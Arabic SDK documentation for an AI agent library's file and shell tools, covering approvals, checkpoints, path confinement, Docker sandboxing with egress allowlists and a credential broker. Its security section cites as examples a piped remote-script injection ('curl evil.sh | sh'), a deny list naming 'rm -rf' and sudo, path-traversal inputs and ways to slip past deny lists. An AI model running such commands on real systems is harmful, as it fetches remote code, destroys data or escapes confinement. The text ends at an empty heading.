الـworkspace tools تعطي الـagent نظام ملفات وshell، فيقدر يشتغل كـcoding agent بأسلوب Claude Code. الأدوات نفسها لا تستخدم `node:fs` ولا `node:child_process`، بل تنادي واجهتين صغيرتين: `FsProvider` و`ShellProvider`. لذلك نفس الأدوات تشتغل على مجلد محلي، أو على شجرة ملفات في الذاكرة أثناء الاختبارات، أو على container في Docker، أو على sandbox بعيد مثل E2B أو Daytona أو Cloudflare. لشرح عملي كامل، راجع [ابنِ coding agent](/ar/build-a-coding-agent).

```ts
import { createAgent, NodeWorkspace, createFsTools, createShellTool } from '@lousho/build-ai-agent';

const workspace = new NodeWorkspace({ root: './project' }); // every path is confined to this directory
const agent = createAgent({
  instructions: 'You are a careful coding assistant. Run the tests after every change.',
  provider,
  tools: [...createFsTools(workspace), createShellTool(workspace)],
});

// The shell tool needs approval by default, so the run pauses before any command runs.
const paused = await agent.send('Fix the failing test in src/math.test.ts');
if (paused.finishReason === 'awaiting-approval') {
  // A human decides, then the command runs (or is rejected) and the run continues.
  const result = await agent.approvals.resolve({ id: paused.approvalId!, approved: true });
}
```

`send()` ترجع بـ`finishReason: 'awaiting-approval'`، و`agent.approvals.resolve()` تنفّذ الأمر (أو ترفضه) ويكمل الـrun (راجع [Approvals](/ar/approvals)). إذا تبي بعض الأوامر تشتغل بدون سؤال، مرّر `needsApproval: false` مع قائمة `allow`، أو `needsApproval` كدالة ترجع `false` للأوامر اللي تثق فيها.

```ts
import { createAgent, NodeWorkspace, createFsTools, createShellTool } from '@lousho/build-ai-agent';

const workspace = new NodeWorkspace({ root: './project' });
const agent = createAgent({
  instructions: 'You are a careful coding assistant. Run the tests after every change.',
  provider,
  tools: [
    ...createFsTools(workspace),
    createShellTool(workspace, { needsApproval: false, allow: ['npm test', 'npm run lint', 'git status', 'git diff'] }),
  ],
});
const result = await agent.send('Fix the failing test in src/math.test.ts');
```

### متقدم: الـexecutor API

`createAgent()` تشغّل `AgentExecutor` تحتها (راجع [executor API](/ar/executor-api)). إذا تبي تملك الربط بنفسك، سجّل الأدوات في `ToolRegistry` ونادِ الـexecutor. التوقف هو نفسه، و`resumeAfterApproval(...)` هي اللي تناديها `agent.approvals.resolve()` لما يوافق بشر:

```ts
import { AgentExecutor, ToolRegistry } from '@lousho/build-ai-agent/executor';
import { NodeWorkspace, createFsTools, createShellTool } from '@lousho/build-ai-agent';

const workspace = new NodeWorkspace({ root: '.' }); // every path is confined to this directory
const registry = new ToolRegistry();
registry.registerMany([...createFsTools(workspace), createShellTool(workspace)]);

// The shell tool needs approval by default, so the run pauses before any command runs.
const paused = await AgentExecutor.execute({ agent, input, provider, toolRegistry: registry, approvalStore });
// paused.finishReason === 'awaiting-approval' -> resumeAfterApproval(...) once a human approves
```

## الأدوات

`createFsTools(fs, options?)` ترجع أدوات `defineTool` هذه:

| الأداة       | المعاملات                                         | ترجع |
| ------------ | ------------------------------------------------- | ------- |
| `read_file`  | `path`، و`offset` اختياري (رقم السطر يبدأ من 1)، و`limit` | أسطر مرقّمة (`"    12\tcode"`). إذا انقطع الناتج، آخر سطر يوضح أي الأسطر عُرضت وقيمة `offset` اللي تكمل منها. الملفات فوق 10 MB تُرفض. |
| `write_file` | `path` و`content`                                 | تنشئ الملف أو تكتب فوقه، وتنشئ المجلدات الأب الناقصة. |
| `edit_file`  | `path` و`old_string` و`new_string`، و`replace_all` اختياري | تستبدل النص المطابق حرفيًا. تفشل برسالة يقدر الـmodel يتصرف عليها إذا كان `old_string` غير موجود (مع تلميح عن نهايات الأسطر CRLF)، أو ظهر أكثر من مرة بدون `replace_all`. |
| `list_dir`   | `path` اختياري                                    | مدخلات مرتبة؛ أسماء المجلدات تنتهي بـ`/`. |
| `glob`       | `pattern`، و`path` اختياري                      | مسارات الملفات المطابقة، مرتبة. `*` تبقى داخل مجلد واحد، `**` تعبر المجلدات، زائد `?` و`[abc]` و`{a,b}`. |
| `grep`       | `pattern` (regex بصيغة JavaScript)، و`path` و`glob` و`ignore_case` اختيارية | `path:line: text` لكل سطر مطابق. الـregex غير الصالح يظهر كخطأ أداة. تُتخطى الملفات الثنائية وما يتجاوز 2 MB. |

| الخيار            | الافتراضي                   | المعنى |
| ----------------- | --------------------------- | ------- |
| `readOnly`        | `false`                     | ينشئ `read_file` و`list_dir` و`glob` و`grep` فقط. |
| `needsApproval`   | لا شيء                      | لكل أداة على حدة: `{ write_file: true, edit_file: ({ path }) => !path.startsWith('src/') }`. |
| `maxReadLines`    | 2000                        | أكثر عدد أسطر ترجعه `read_file` في الاستدعاء الواحد. |
| `maxOutputChars`  | 50,000                      | أكثر عدد محارف ترجعه الأداة في الاستدعاء الواحد. |
| `maxResults`      | 200                         | أكثر عدد مسارات أو تطابقات أو مدخلات ترجعه `glob` و`grep` و`list_dir`. |
| `maxFilesScanned` | 20,000                      | أكثر عدد ملفات تمرّ عليها `glob` أو `grep` أثناء البحث. |
| `ignore`          | `['.git', 'node_modules']`  | أسماء مجلدات تتخطاها `glob` و`grep`. |
| `checkpoints`     | لا شيء                      | كائن `WorkspaceCheckpoints`: يحتفظ بنسخة احتياطية من كل ملف تغيّره `write_file` و`edit_file`، لتقدر ترجّع التغييرات (انظر أدناه). |

`createShellTool(shell, options?)` يرجع أداة واحدة اسمها `shell`، تأخذ `command` و`timeout_ms` اختياري، وترجع `{ exitCode, stdout, stderr }`. إذا انقتل الأمر، تحمل النتيجة أيضًا `timedOut: true` أو `aborted: true` مع `note` توضح السبب.

| الخيار             | الافتراضي   | المعنى |
| ------------------ | --------- | ------- |
| `needsApproval`    | `true`    | `true` أو `false`، أو predicate على نص الأمر. |
| `allow`            | لا شيء    | إذا عيّنته، لا ينفَّذ إلا الأوامر المطابقة. |
| `deny`             | لا شيء    | الأوامر المطابقة تُرفض. |
| `defaultTimeoutMs` | 120,000   | الـtimeout لما الـmodel ما يمرّر `timeout_ms`. |
| `maxTimeoutMs`     | 600,000   | أي `timeout_ms` أكبر من هذا ينزل لهذه القيمة. |
| `maxOutputChars`   | 30,000    | لكل stream. بعد هذا الحد يبقى أول الناتج وآخره والوسط يُستبدل بعلامة. |
| `cwd`، `env`       | لا شيء    | مجلد العمل (بالنسبة للـworkspace) ومتغيرات إضافية لكل أمر. |
| `name`             | `'shell'` | اسم الأداة. |

```ts
import { createShellTool, NodeWorkspace } from '@lousho/build-ai-agent';

const shell = createShellTool(new NodeWorkspace({ root: '.' }), {
  needsApproval: (command) => !/^(ls|cat|git (status|diff|log))\b/.test(command), // read-only commands run without asking
  deny: ['rm -rf', /\bsudo\b/],
  defaultTimeoutMs: 60_000,
});
```

إلغاء الـrun (بـ`agent.send(input, { signal })` أو `AgentExecutor.execute({ signal })`) يقتل الأمر الشغال وكل العمليات اللي بدأها: كمجموعة عمليات في Linux وmacOS، وبـ`taskkill /T` في Windows.

إذا تبي ترجّع اللي عمله الـagent بالملفات، مرّر `WorkspaceCheckpoints` إلى `createFsTools(fs, { checkpoints })`. قبل ما تغيّر `write_file` أو `edit_file` أي ملف، يُسجَّل محتواه القديم (وبتات صلاحياته إذا عند الـprovider `getMode` و`chmod`، مثل `NodeWorkspace`) تحت session الـrun ورقم الـturn. الـturn هو رقم رسالة المستخدم اللي يجاوب عليها الـtool call، ويبدأ من 0: أول `session.send()` هو turn 0، واللي بعده turn 1. `checkpoints.list({ sessionId })` ترجع الـturns اللي صار فيها تغيير والمسارات اللي تغيّرت في كل واحد. و`checkpoints.rewind(toTurn, { sessionId })` يرجّع كل ملف تغيّر في turn `toTurn` أو بعده لحالته قبل `toTurn`: الملف اللي أنشأه الـagent يُحذف، واللي عدّله أو كتب فوقه يسترجع محتواه. مع `dryRun: true` ما يتغيّر شيء ويرجع نفس التقرير.

```ts
import { createAgent, createFsTools, MemoryWorkspace, WorkspaceCheckpoints } from '@lousho/build-ai-agent';
import { mockModel } from '@lousho/build-ai-agent/testing';

const workspace = new MemoryWorkspace({ files: { 'notes.md': '# Notes\n' } });
const checkpoints = new WorkspaceCheckpoints(workspace); // backups in memory; FileWorkspaceCheckpointStore keeps them on disk
const agent = createAgent({
  instructions: 'You edit files in the workspace.',
  provider: mockModel([
    { toolCalls: [{ name: 'edit_file', args: { path: 'notes.md', old_string: '# Notes', new_string: '# Plan' } }] },
    'Renamed the heading.',
    { toolCalls: [{ name: 'write_file', args: { path: 'todo.md', content: '- ship it\n' } }] },
    'Added a to-do list.',
  ]),
  tools: createFsTools(workspace, { checkpoints }),
});

const session = agent.session();
await session.send('Rename the heading to Plan'); // turn 0
await session.send('Start a to-do list'); // turn 1
console.log(await checkpoints.list({ sessionId: session.id }));
// [{ turn: 0, paths: ['notes.md'] }, { turn: 1, paths: ['todo.md'] }]

const preview = await checkpoints.rewind(0, { sessionId: session.id, dryRun: true });
console.log(preview); // { dryRun: true, restored: ['notes.md'], deleted: ['todo.md'], skipped: [] }
await checkpoints.rewind(0, { sessionId: session.id });
console.log(workspace.snapshot()); // { 'notes.md': '# Notes\n' }
```

الملف اللي محتواه لم يعد آخر ما كتبه الـagent فيه تغيّر بشيء ثاني (إنت، أو محرّر، أو أداة `shell`)، فيتركه الـrewind ويبلّغ عنه في `skipped` كـ`'changed-since'`؛ مرّر `force: true` إذا تبي تسترجعه على أي حال. والمسار الموجود لكنه مو ملف (مجلد مثلًا) يُتخطى كـ`'not-a-file'`. كل مسار يُفحص قبل كتابة أي شيء، والاستعادة تمرّ عبر نفس الـprovider، فيبقيها `NodeWorkspace` داخل الـroot، والـsymlinks ضمن ذلك. الـrewind الفعلي ينسى بعدها النسخ الاحتياطية للـturns اللي رجّعها، بما فيها نسخ الملفات المتخطّاة، فالـrewind الثاني ما يسوي شيء: شوف الـdry run أولًا. المجلدات اللي أنشأها الـagent تبقى (فارغة) بعد حذف ملفاتها. المحادثة نفسها لا تُرجَّع؛ إذا تبي تفرّعها كمان، اعمل fork للـsession بـ`session.fork({ fromStep })` (راجع [تفريع جلسة](/ar/sessions#forking-a-session)؛ حقل `turn` للخطوة في `session.history()` هو رقم الـturn المستخدم هنا)، أو اعمل fork لـrun واحد بـ`agent.fork()` (راجع [Fork and replay](/ar/durable-execution#fork-و-replay)).

اللي ما يُتتبَّع: التغييرات اللي تسويها أداة `shell`، والملفات اللي يكتبها sub-agent بأدوات ملفات خاصة فيه (إلا إذا أخذ نفس كائن `WorkspaceCheckpoints`، فتُسجَّل وقتها تحت session id الخاص فيه)، والملفات الأكبر من `maxFileBytes` (الافتراضي 1,000,000 بايت): تُبلَّغ كـ`'too-large'` ولا تُحذف أبدًا. بدون session، كل `agent.send()` هو turn 0 في الـsession `'default'`، فاستخدم `agent.session()` إذا تبي ترجّع حسب الـturn. الـturns تُعدّ في السجل اللي يشوفه الـmodel، فبعد ما يحذف الـcompaction رسائل مستخدم قديمة يتزحزح ترقيم الـturns اللاحقة.

النسخ الاحتياطية ما تكبر بلا حد. يُحتفظ فقط بأحدث `maxTurns` turn لكل session (الافتراضي 20؛ و`rewind()` لـturn أقدم يرمي خطأ)؛ والملف الأكبر من `maxFileBytes` لا يُنسخ؛ وإذا كتب turn واحد نفس المسار عدة مرات، أول كتابة فقط تحتفظ بالمحتوى القديم (الكتابات اللاحقة تحتفظ بـhash لسجل التدقيق)؛ والـrewind يسقط النسخ اللي رجّعها؛ و`checkpoints.clear({ sessionId })` ينسى session كاملة. الـstore الافتراضي يحتفظ بالنسخ في الذاكرة. و`new FileWorkspaceCheckpointStore(dir)` يكتب ملف JSON واحد لكل session كتابة ذرّية (ملف مؤقت ثم rename)، فيشتغل الـrewind بعد إعادة التشغيل؛ نفّذ `WorkspaceCheckpointStore` إذا تبي تحفظها في مكان آخر. محتوى الملفات يعيش في الـstore فقط، ولا يظهر أبدًا في الأحداث أو الـtraces.

## نموذج الأمان

اقرأ هذا قبل ما تعطي model وصولًا لـshell.

### ما يُفرَض

**المسارات تبقى داخل الـroot.** قبل لمس أي ملف، `NodeWorkspace` (و`MemoryWorkspace` كذلك) يطبّق normalize على كل مسار. هذه الحالات تُرفض على كل المنصات:

- `..` اللي يطلع فوق الـroot (`../secret` و`src/../../secret`)
- المسارات المطلقة (`/etc/passwd`، وحتى المسار المطلق اللي يشير لداخل الـroot)
- حروف الأقراص في Windows (`C:\Windows` و`C:secret`)
- مسارات UNC والمسارات الممتدة (`\\server\share` و`//server/share` و`\\?\C:\`)
- بايتات NUL

الشرطات المائلة العكسية تُحسب فواصل في كل مكان، فخلط الفواصل (`src/..\..\secret`) ما يقدر يخفي `..`. وفي Windows تُرفض أيضًا `:` (alternate data streams)، وأسماء الأجهزة المحجوزة (`CON` و`NUL` و`COM1` ...)، والمقاطع المكوّنة من نقاط ومسافات فقط (Windows يحذف النقاط والمسافات من آخر الاسم، فـ`.. ` كانت ستتصرف كـ`..`).

**الـsymlinks ما تقدر تطلع.** بعد هذا الفحص، يحلّ `NodeWorkspace` المسار بـ`realpath`. إذا المسار غير موجود بعد، يحلّ أعمق جزء موجود منه. والنتيجة لازم تبقى داخل المسار الحقيقي للـroot نفسه. يعني:

- رابط داخل الـroot يشير لخارجه يُرفض للقراءة، وللكتابة على ملفات غير موجودة بعد (`escape-link/new.txt`).
- رابط هدفه غير موجود لا يُتبع أبدًا، لأن الكتابة عبره ممكن تنشئ ملفًا خارج الـroot.
- `glob` و`grep` لا تتبعان الروابط أبدًا أثناء المرور على الشجرة.
- `rm` على رابط تحذف الرابط نفسه وتترك هدفه.

**الرفض يظهر كخطأ أداة.** مسار مرفوض، أو ملف غير موجود، أو تعديل مبهم يرمي `WorkspaceError` داخل الأداة. يستلم الـmodel `{ "error": "WorkspaceError", "toolName": "read_file", "message": "..." }` ويكمل الـrun. الرسائل تعرض مسار الـworkspace، ولا تعرض أبدًا مسار الـhost.

**الأوامر تشتغل ببيئة دنيا.** `NodeWorkspace` ينفّذ الأوامر مع `cwd` مضبوط على الـroot، ولا يورّثها بيئة العملية الأم. اللي يُنسخ فقط: `PATH` و`HOME` و`USERPROFILE` و`TEMP` و`TMP` و`TMPDIR` و`LANG` و`LC_*` و`TERM`، زائد `SystemRoot` و`SystemDrive` و`ComSpec` و`PATHEXT` و`WINDIR` في Windows، لأن الـshell يحتاجها حتى يشتغل. بالتالي `OPENAI_API_KEY` و`ANTHROPIC_API_KEY` وبيانات اعتماد السحابة وغيرها من الأسرار في بيئة السيرفر عندك غير مرئية للأوامر اللي يكتبها الـmodel، ولا يقدر `env` أو `printenv` يكشفها. إذا تبي تعطي الأوامر أكثر، إما مرّر قيمًا (`env: { GITHUB_TOKEN: scopedToken }`) أو سمِّ متغيرات من الـhost تُنسخ (`inheritEnv: ['CI']`). أي شيء تمرّره بهذه الطريقة مرئي للـmodel. `inheritEnv: true` يمرّر بيئة الـhost كاملة، زي ما كان الوضع قبل وجود هذا السلوك الافتراضي؛ استخدمه فقط مع أوامر تثق فيها. وفي Windows يضيف مشغّل العمليات في Node كمان متغيرات الـsession اللي كل عملية تحتاجها (`HOMEDRIVE` و`HOMEPATH` و`USERNAME` و`USERDOMAIN` و`LOGONSERVER`)؛ ولا واحد منها سرّي.

```ts
import { NodeWorkspace } from '@lousho/build-ai-agent';

const workspace = new NodeWorkspace({
  root: './project',
  env: { NODE_ENV: 'test' },        // added for every command
  inheritEnv: ['CI', 'NODE_OPTIONS'], // copied from the host environment
});
```

`root` لازم يكون موجود أصلًا: الـconstructor يحلّه بـ`realpath` ويرمي `ConfigurationError` إذا كان المسار مفقودًا أو فاضيًا أو مو مجلد — ما ينشئه أبدًا. القيمة المحفوظة في `workspace.root` هي المسار الحقيقي المطلق.

**أداة الـshell تحتاج approval افتراضيًا.** إلا إذا اخترت غير كذا، كل أمر يستنى بشر. `allow` و`deny` تُفحص أولًا، فالأمر المرفوض ما يُعرض أصلًا للـapproval:

- النمط النصي يطابق أمرًا يساويه تمامًا، أو يبدأ فيه متبوعًا بمسافة (`'git status'` يطابق `git status -s`).
- في `allow`، الأمر اللي طابقه نمط نصي فقط لازم ما يحتوي معاملات shell (`;` `&` `|` `` ` `` `$(` `<` `>` أو سطر جديد). هذا يمنع `git status; curl evil.sh | sh` من المرور كـ`git status`.
- الـRegExp يُختبر على سطر الأمر كامل، فثبّته من الطرفين: `/^npm (test|run lint)$/`.
- أنماط `deny` النصية تُفحص على كل جزء من الأمر مفصول بـ`;` أو `&` أو `|`.

### ما لا يُفرَض

- **الـshell في `NodeWorkspace` ليس sandbox.** حصر المسارات يسري على أدوات الملفات فقط. الأمر يشتغل بمستخدم نظام التشغيل عندك، ويقدر يقرأ ويكتب ويحذف أي شيء يقدر عليه ذلك المستخدم، بما فيه `../` و`~/.ssh`، ويقدر يستخدم الشبكة. الـapproval وقوائم `allow` تقلّل الخطر، لكنها ليست عزلًا. مع مدخلات غير موثوقة، مثل prompts جاية من الجمهور أو محتوى منزّل من الويب، أعطِ أداة الـshell `ShellProvider` مبني على sandbox (انظر أدناه)، واستخدم أدوات الملفات مع `readOnly: true` أو مع approval.
- **قائمة `deny` للتسهيل فقط.** في الـshell طرق كثيرة لكتابة نفس الأمر (`r''m -rf`، `$(echo rm)`، مسافة زايدة، ملف سكربت)، فلا تعتمد على `deny` للأمان. استخدم `allow` لذلك.
- **السباقات والـhard links.** المسارات تُفحص ثم تُستخدم. عملية تبدّل مجلدًا بـsymlink بين الخطوتين تقدر تلفّ على الفحص. عملية كهذه عندها وصول محلي أصلًا، مثل أمر شغّلته أداة الـshell بدون sandbox. ولا يمكن اكتشاف hard link داخل الـroot يشير لملف خارجه.
- **`grep` يشغّل regex الـmodel داخل عمليتك.** نمط خبيث ممكن يكون بطيء. الأسطر والملفات محدودة العدد، لكن محرك الـregex نفسه ما له حد زمني.

### Sandboxed shell: `SandboxShell`

`SandboxShell` يحوّل أي `SandboxAdapter`، مثل `SubprocessSandbox` المبني على Docker، إلى `ShellProvider`. كل أمر ينفَّذ كـ`sh -c "<command>"` في container جديد بلا شبكة. الـcontainer يشوف `cwd` فقط، وهو مربوط bind-mount على نفس المسار. وما ياخذ إلا الـ`env` اللي تمرّره، ولا شيء من الـhost. أدوات الملفات تقدر تكمل تستخدم `NodeWorkspace` على نفس المجلد:

```ts
import { createFsTools, createShellTool, NodeWorkspace, SandboxShell, SubprocessSandbox } from '@lousho/build-ai-agent';

const workspace = new NodeWorkspace({ root: './project' });
const shell = new SandboxShell(new SubprocessSandbox({ image: 'node:20-alpine' }), { cwd: workspace.root });
const tools = [...createFsTools(workspace), createShellTool(shell, { needsApproval: false })];
```

**البيئة والشبكة.** `SandboxShell` يأخذ نفس خياري `env` و`inheritEnv` الخاصين بـ`NodeWorkspace`. الـcontainer ياخذ هذه المتغيرات فقط: لا بيئة الـhost أبدًا، ولا `PATH` ولا `HOME` الخاصين بالـhost، لأن الـimage تجيب قيمها بنفسها. مع `NoopSandbox` (اللي يشتغل على الـhost) ياخذ الأمر نفس القاعدة الصغيرة اللي يستخدمها `NodeWorkspace`، زائد متغيراتك؛ و`inheritEnv: true` يرجّع بيئة الـhost كاملة هناك، لكن الـcontainer ما يستلمها أبدًا ولا بذلك.

`SubprocessSandbox` يأخذ سياسة `network`:

| `network` | اللي يحصل عليه الـcontainer |
|---|---|
| `'none'` (الافتراضي) | لا شبكة إطلاقًا (`NetworkMode: 'none'` في Docker). |
| `'default'` | شبكة Docker الافتراضية: egress غير مقيد. |
| `{ allow: ['api.github.com', '*.npmjs.org'] }` مع `broker` | هذه الـhosts فقط، عبر الـ[credential broker](#credential-broker). التفاصيل أدناه. |
| `{ allow: [...] }` بدون `broker` | لا شبكة (fail-closed). |

أسماء الـhosts تُفحص لما يُنشأ الـsandbox، فعنوان URL أو اسم غير سليم يرمي خطأ؛ والقائمة بعد التحقق تُحفظ في `sandbox.network`.

#### Allowlisted egress: `network: { allow }` with a broker

Docker ما يقدر لوحده يفلتر الـegress حسب اسم الـhost، فقائمة `allow` ما تُفرَض إلا لما يكون الـproxy هو الطريق الوحيد للخروج من الـcontainer. `SubprocessSandbox` يبني هذا بعناصر Docker نفسها:

1. عند أول `run()` ينشئ شبكة bridge **داخلية** (`Internal: true`، بلا IPv6، وبـlabel `com.lousho.sandbox=egress`) اسمها `networkName` أو `lousho-egress-<random>`. الشبكة الداخلية ما فيها طريق خارج الـbridge. إذا كانت موجودة شبكة بهذا الاسم، تُستعمل من جديد، لكن فقط إذا كانت داخلية.
2. الـbroker ياخذ listener ثاني على عنوان الـgateway لتلك الشبكة، وهو في Docker Engine على Linux واجهة الـhost نفسها على الـbridge. يقبل اتصالات من subnet تلك الشبكة فقط (أي طرف ثاني يُقطع قبل قراءة بايت واحد)، فهو ليس proxy مفتوح على باقي واجهات الـhost. قائمته هي hosts قواعد الـbroker زائد قائمة `allow` الخاصة بالـsandbox. خيار `allow` الخاص بالـbroker وlistener الـloopback ما يتغيرون.
3. كل container ينضم لتلك الشبكة مع `HTTP_PROXY`/`HTTPS_PROXY` (وصيغها الصغيرة) مضبوطة على listener الـgateway، مدمجة فوق `env` اللي تمرّره. `NO_PROXY` فيه عنوان الـgateway فقط، فيوصل `$HTTP_PROXY/__broker/<host>/<path>` (صيغة المسار اللي تضيف credentials) للـbroker مباشرة؛ وما يعطي أي bypass ثاني، لأنه ما فيه شيء ثاني قابل للوصول أصلًا.
4. `sandbox.close()` يوقف الـlistener ويحذف الشبكة إذا كان هذا الـsandbox هو اللي أنشأها. الـrun الملغي أو منتهي الـtimeout يحذف الـcontainer مثل قبل؛ والشبكة تبقى للـrun التالي للـsandbox حتى تنادي `close()`.

```ts
import { createCredentialBroker, createShellTool, SandboxShell, SubprocessSandbox } from '@lousho/build-ai-agent';

const token = 'ghp_example'; // read from your secret store; it never enters the container
const broker = await createCredentialBroker({ rules: { 'api.github.com': { authorization: () => `Bearer ${token}` } } });
const sandbox = new SubprocessSandbox({ image: 'node:20-alpine', network: { allow: ['registry.npmjs.org'] }, broker });
const tool = createShellTool(new SandboxShell(sandbox, { cwd: '/abs/path/to/project' }), { needsApproval: false });
// ... run the agent with `tool` ...
await sandbox.close();
await broker.close();
```

اللي يفرضه هذا، وأين:

- **Docker Engine على Linux والـagent على نفس الـhost: مفروض.** الـcontainer يقدر يوصل لعنوان الـgateway ولا شيء بعد الـbridge. في DNS: الـcontainer ما يحلّ أي أسماء خارجية بنفسه (Engine 25.0.5 وأحدث ما يمرّرون DNS من الشبكات الداخلية، CVE-2024-29018؛ والإصدارات الأقدم تُرفض)، فالأسماء تروح للـproxy اللي يحلّها على الـhost بعد فحص الـallowlist. الاتصالات المباشرة بـIP خام ما لها route. البروتوكولات غير HTTP (SSH وTCP خام وUDP) محجوبة، لأن الـproxy وحده اللي يمكن الوصول له، وأنفاق `CONNECT` تُفحص على الـallowlist مثل أي طلب. وهذا مُختبَر على daemon حقيقي: الـCI workflow الخاص بـDocker Engine (`.github/workflows/docker.yml` و`npm run test:docker`) يشتغل على runner `ubuntu-latest` في GitHub (كان Docker Engine بصلاحيات root بالإصدار 28.0.4 على Ubuntu 24.04 لما أُضيف)، ويتأكد من أن الـhost المسموح يجاوب عبر الـbroker، وأن باقي الـhosts تاخذ 403، وأن تجاوز الـproxy أو الاتصال بـIP خام ما له route، وأن الـcontainer ما يحلّ أسماء خارجية، وأن الـbroker يضيف credentials ما يشوفها الـcontainer أبدًا، وأن container خارج الشبكة ما يقدر يستخدم listener الـgateway، وأن `close()` والـrun الملغي ما يتركان شبكة ولا container وراهم، وأن الشبكة المعاد استخدامها غير الداخلية تُرفض.
- **Docker Desktop (Windows وmacOS، وDesktop على Linux): مرفوض.** الـcontainers تشتغل داخل VM، فالـhost ما له عنوان على الشبكة الداخلية. و`host.docker.internal` يوصل للـhost فقط من الشبكات غير الداخلية، وهذي توصل لكل شيء ثاني كمان. `run()` يرفض بـ[`LOUSHO_SANDBOX_EGRESS_UNSUPPORTED`](/ar/errors#lousho_sandbox_egress_unsupported) وما يشغّل أي container. ونفس الشيء مع Docker rootless (الـbridge عايش في network namespace خاص فيه)، ومع daemon على جهاز ثاني (الـbroker ما يقدر يربط عنوان الـgateway)، ومع شبكة معاد استخدامها ليست داخلية، ومع Engine أقدم من 25.0.5.
- **خدمات ثانية على عنوان الـbridge في الـhost.** container على شبكة داخلية يقدر يوصل لأي خدمة على الـhost تستمع على عنوان الـgateway أو على كل العناوين (`0.0.0.0`). اربط خدمات الـhost بـ`127.0.0.1`، أو حط جدار ناري يقيّد subnet الـbridge لمنفذ الـbroker فقط. جدار ناري على الـhost يسقط الترافيك الجاي من الـbridge (سياسة `INPUT` صارمة) يحجب الـbroker كمان: وقتها الـruns تفشل في الاتصال، ولا تاخذ egress مفتوح.
- **أوامر الـhost ما زالت بدون جدار ناري.** أمر ينفّذه `NodeWorkspace` أو `NoopSandbox` يقدر يتجاهل متغيرات الـproxy؛ راجع ملاحظات الـcredential broker أدناه.

هذه الضمانات مبنية على السلوك الموثّق للشبكات الداخلية في Docker؛ واختبارات الـSDK تفحص الربط على client مزيّف لـDocker، مو على daemon حي.

```ts
import { createShellTool, SandboxShell, SubprocessSandbox } from '@lousho/build-ai-agent';

const sandbox = new SubprocessSandbox({ image: 'node:20-alpine', network: 'none' });
const shell = new SandboxShell(sandbox, {
  cwd: '/abs/path/to/project',
  env: { NODE_ENV: 'test' }, // set for every command
  inheritEnv: ['CI'],        // copied from the host environment
});
const tool = createShellTool(shell, { needsApproval: false });
```

اللي ما يغطيه هذا: أي قيمة تمرّرها في `env` أو `inheritEnv` تقدر أوامر الـmodel تقراها، و`network: 'default'` يخلي الأمر يرسلها لأي مكان. خلّي الأسرار طويلة الأمد برّا الاثنين؛ استخدم الـcredential broker أدناه بدلًا منها.

لما يُلغى الـrun، يمرّر `SandboxShell` إشارة الإلغاء للـadapter. عندها `SubprocessSandbox` يقتل الـcontainer ويحذفه، وأداة الـshell تبلّغ `aborted: true`؛ والإشارة اللي ملغاة أصلًا ما تشغّل أي container. الـadapter اللي يتجاهل `SandboxRunOptions.signal` ما يُنتظَر بعدها، لكن أمره يكمل شغال حتى تنتهي مهلته؛ وأداة الـshell دائمًا تحدد مهلة.

### Credential broker

أحيانًا أمر يشغّله الـmodel (`git` أو `curl` أو سكربت) يحتاج ينادي API يتطلب auth، لكن أي token في بيئته يقدر الـmodel يقراه. `createCredentialBroker()` يخلي الـtoken على الـhost: يشغّل HTTP proxy محلي يضيف headers الـauth للطلبات الموجهة للـhosts اللي تسمّيها، فالأمر ما يشوف إلا عنوان الـproxy.

```ts
import { createCredentialBroker, NodeWorkspace } from '@lousho/build-ai-agent';

const token = 'ghp_example'; // read from your secret store; never passed to the command
const broker = await createCredentialBroker({
  rules: { 'api.github.com': { authorization: () => `Bearer ${token}` } },
  allow: ['registry.npmjs.org'], // reachable without injected headers
});
const workspace = new NodeWorkspace({ root: './project', env: { ...broker.env } });
await workspace.exec(`curl -s ${broker.baseUrl('api.github.com')}/user`);
await broker.close();
```

- **اللي يرجعه.** `url` (الـproxy، على port مؤقت على `127.0.0.1` افتراضيًا)، و`env` (`HTTP_PROXY` و`HTTPS_PROXY` و`NO_PROXY` وصيغها الصغيرة، لخيار `env` في `NodeWorkspace` أو `SandboxShell`)، و`baseUrl(host)`، و`close()` اللي يوقف الـlistener ويغلق الـsockets المفتوحة. قيمة الـheader تكون string أو دالة تُنادى مع كل طلب.
- **الـallowlist.** hosts القواعد (أسماء مطابقة تمامًا أو `*.suffix`، وهذه تطابق الـsubdomains فقط — `*.example.com` ما يطابق `example.com`) مسموحة ضمنيًا؛ و`allow` يضيف hosts توصل بدون headers محقونة. أي host ثاني ياخذ 403 قبل ما ينفتح أي اتصال. الـhosts اللي تحلّ إلى loopback أو link-local (مثل عنوان metadata السحابي `169.254.169.254`) أو عناوين خاصة تُرفض إلا إذا مدرجة في `allowPrivate`، فالأمر ما يقدر يستخدم الـproxy للوصول لخدمات على جهازك أو شبكتك.
- **الأسرار تبقى على الـhost.** القيم المحقونة ما تظهر أبدًا في `env`، ولا في ردود خطأ الـproxy، ولا في أي log. الطلب الموجه لـhost يخدمه الـbroker واللي يحمل أصلًا header `Authorization` يُحذف ويُستبدل. الـhop-by-hop headers (`Connection` و`Proxy-Authorization` وغيرها) ما تُمرَّر.
- **قيد HTTPS.** حقن الـheaders يشتغل على طلبات HTTP العادية وعلى صيغة المسار: الـbroker يخدم `http://127.0.0.1:<port>/__broker/<host>/<path>` ويمرّره إلى `https://<host>/<path>` مع إضافة الـheaders، وهذا اللي يرجعه `baseUrl(host)`. وجّه أي أداة لذلك الـbase URL (مثل خيار `baseURL` في SDK معيّن، أو URL لأمر `curl`) حتى تاخذ auth بدون ما تمسك الـtoken. أما client يستخدم `HTTPS_PROXY` مع عنوان `https://` فيفتح نفق `CONNECT` بدلًا: الـbroker يفحص الـallowlist على هدف النفق ويمرّر البايتات المشفرة كما هي، فما ينضاف أي header. الـbroker ما يعترض TLS.
- **ليس جدارًا ناريًا على الـhost.** أمر ينفّذه `NodeWorkspace` يقدر يتجاهل متغيرات الـproxy ويفتح اتصالاته بنفسه؛ الـallowlist تغطي فقط الترافيك المار عبر الـbroker. اللي يضمنه الـbroker هو أن الـtoken ما يكون أبدًا في متناول الأمر.
- **الـcontainers.** لا تمرّر `broker.env` لـ`SubprocessSandbox`: هو يشير لـloopback الـhost. مرّر الـbroker نفسه بدلًا منه، `new SubprocessSandbox({ network: { allow }, broker })`، والـsandbox يوجّه الـcontainers عبره (راجع [Allowlisted egress](#allowlisted-egress-network-allow-with-a-broker)). يسوي هذا بـ`broker.listen({ host, clients, allow })` اللي يضيف listener على عنوان ثاني يخدم فقط الـpeers من subnet `clients`، وقائمته هي hosts القواعد زائد `allow`. الـbroker ما يستمع إلا على loopback إلا إذا ناديت هذه الدالة.

## اكتب provider خاص بك

